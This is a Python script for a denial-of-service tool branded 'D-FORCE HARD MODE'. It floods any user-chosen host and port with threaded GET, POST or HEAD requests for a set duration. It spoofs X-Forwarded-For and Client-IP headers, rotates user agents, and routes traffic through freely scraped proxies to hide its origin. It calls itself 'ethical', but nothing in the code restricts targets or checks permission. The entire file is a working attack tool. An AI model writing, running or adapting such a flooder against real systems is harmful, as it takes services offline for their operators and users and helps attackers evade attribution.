import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import random, time, logging, sys
from datetime import datetime, timedelta
from tqdm import tqdm
from rich.console import Console
from rich.panel import Panel
from rich import box

requests.packages.urllib3.disable_warnings()

console = Console()

logging.basicConfig(
    filename="ddos_report.log",
    filemode='a',
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

BANNER = r"""
=========================================
   ____  ______   ________  ________     
  |  _ \|  ____| |  ____\ \/ /  ____|    
  | | | | |__    | |__   \  /| |__       
  | | | |  __|   |  __|  /  \|  __|      
  | |_| | |____  | |____/ /\ \ |____     
  |____/|______| |______/_/  \_\______|  
                                        
      D-FORCE HARD MODE DDoS TOOL       
=========================================
           Developer: MD Abdullah
       Telegram: @mdabdull01h
=========================================
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
]

REFERERS = ["https://google.com", "https://bing.com", "https://yahoo.com"]

HTTP_METHODS = ["GET", "POST", "HEAD"]

proxy_list = []

def fetch_proxies():
    global proxy_list
    try:
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all"
        proxies = requests.get(url).text.strip().split("\n")
        proxy_list = [p.strip() for p in proxies if p.strip()]
        logging.info(f"Fetched {len(proxy_list)} proxies.")
    except:
        logging.warning("Could not fetch proxies.")
        proxy_list = []

def build_headers():
    spoofed_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": spoofed_ip,
        "Client-IP": spoofed_ip,
        "Accept": "*/*",
        "Connection": "keep-alive",
    }

def get_random_proxy():
    if not proxy_list:
        return None
    return {"http": f"http://{random.choice(proxy_list)}", "https": f"http://{random.choice(proxy_list)}"}

def attack_request(target_url, method="GET", use_proxy=False):
    try:
        headers = build_headers()
        proxies = get_random_proxy() if use_proxy else None
        if method == "GET":
            resp = requests.get(target_url, headers=headers, timeout=5, verify=False, proxies=proxies)
        elif method == "POST":
            data = {"data": random.randint(1000, 9999)}
            resp = requests.post(target_url, headers=headers, data=data, timeout=5, verify=False, proxies=proxies)
        elif method == "HEAD":
            resp = requests.head(target_url, headers=headers, timeout=5, verify=False, proxies=proxies)
        else:
            resp = requests.get(target_url, headers=headers, timeout=5, verify=False, proxies=proxies)
        return resp.status_code
    except:
        return None

def run_attack(target, port, method, threads, duration, use_proxy):
    target_url = f"http://{target}:{port}/"
    end_time = datetime.now() + timedelta(seconds=duration)
    total, success, failed = 0, 0, 0
    proxy_update_interval = 10
    last_proxy_time = time.time()

    if use_proxy:
        fetch_proxies()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        pbar = tqdm(total=duration, desc="Attacking...", unit="s")

        while datetime.now() < end_time:
            if use_proxy and (time.time() - last_proxy_time > proxy_update_interval):
                fetch_proxies()
                last_proxy_time = time.time()

            futures.append(executor.submit(attack_request, target_url, method, use_proxy))
            time.sleep(0.01)
            pbar.update(0.01)

        pbar.close()

        for future in as_completed(futures):
            total += 1
            status = future.result()
            if status and 200 <= status < 400:
                success += 1
            else:
                failed += 1

    logging.info(f"[{target_url}] Total: {total} | Success: {success} | Fail: {failed}")

    print("\n[+] Attack Summary")
    print(f"Target: {target_url}")
    print(f"Total requests: {total}")
    print(f"Successful: {success}")
    print(f"Failed: {failed}")

def menu():
    print("""
==========================
   D-FORCE HARD MODE
==========================
1. Start Attack
2. Exit
""")
    return input("Enter choice (1 or 2): ").strip()

def parse_args():
    parser = argparse.ArgumentParser(description="D-FORCE Hard Mode Ethical DDoS Tool")
    parser.add_argument("-t", "--target", help="Target domain or IP")
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("-m", "--method", choices=HTTP_METHODS, default="GET")
    parser.add_argument("-th", "--threads", type=int, default=100)
    parser.add_argument("-d", "--duration", type=int, default=60)
    parser.add_argument("--proxy", action='store_true', help="Enable proxy rotation")
    return parser.parse_args()

def main():
    console.print(Panel(BANNER, box=box.DOUBLE, style="bold cyan"))
    args = parse_args()

    if not args.target:
        while True:
            choice = menu()
            if choice == "1":
                target = input("Target domain or IP: ").strip()
                port = int(input("Port (default 80): ") or 80)
                method = input(f"Method {HTTP_METHODS} (default GET): ").strip().upper() or "GET"
                if method not in HTTP_METHODS:
                    print("Invalid method. Defaulting to GET.")
                    method = "GET"
                threads = int(input("Threads (default 100): ") or 100)
                duration = int(input("Duration in seconds (default 60): ") or 60)
                proxy = input("Enable proxy rotation? (y/n): ").strip().lower() == 'y'
                run_attack(target, port, method, threads, duration, proxy)
            elif choice == "2":
                print("Exiting...")
                sys.exit(0)
            else:
                print("Invalid choice.")
    else:
        run_attack(args.target, args.port, args.method, args.threads, args.duration, args.proxy)

if __name__ == "__main__":
    main()
